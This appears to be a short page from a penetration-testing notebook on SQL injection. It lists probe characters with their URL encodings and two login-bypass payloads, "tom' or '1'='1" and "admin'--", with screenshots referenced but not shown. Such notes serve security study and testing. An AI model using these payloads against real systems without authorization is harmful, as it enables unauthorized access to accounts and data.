# SQL Injections

<figure><img src="../../.gitbook/assets/types_of_sqli.jpg" alt=""><figcaption></figcaption></figure>

## Basic SQLi Discovery

| Payload | URL Encoded |
| ------- | ----------- |
| `'`     | `%27`       |
| `"`     | `%22`       |
| `#`     | `%23`       |
| `;`     | `%3B`       |
| `)`     | `%29`       |

### Basic Injection

<pre><code><strong>tom' or '1'='1
</strong></code></pre>

<figure><img src="../../.gitbook/assets/image (18).png" alt=""><figcaption></figcaption></figure>

### Using Comments

```
admin'--
```

<figure><img src="../../.gitbook/assets/admin_dash.png" alt=""><figcaption></figcaption></figure>
